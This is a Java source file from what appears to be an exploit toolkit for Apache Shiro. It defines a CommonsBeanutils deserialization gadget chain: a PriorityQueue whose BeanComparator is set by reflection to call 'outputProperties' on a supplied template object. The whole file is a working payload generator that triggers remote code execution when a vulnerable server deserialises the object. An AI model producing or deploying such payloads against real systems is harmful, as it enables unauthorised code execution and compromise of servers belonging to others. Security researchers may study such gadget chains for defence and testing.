package com.liev.clouds.payload.shiro;


import com.liev.clouds.annotation.Authors;
import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;

import java.util.PriorityQueue;
import java.util.Queue;

// Apache Commons Lang
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({"水滴"})
public class CommonsBeanutilsObjectToStringComparator implements ObjectPayload<Queue<Object>>{

    @Override
    public Queue<Object> getObject(Object template) throws Exception {

        ObjectToStringComparator stringComparator = new ObjectToStringComparator();


        BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator());

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);


        queue.add(stringComparator);
        queue.add(stringComparator);


        ReflectionsUtils.setFieldValue(queue, "queue", new Object[] { template, template });

        ReflectionsUtils.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }
}
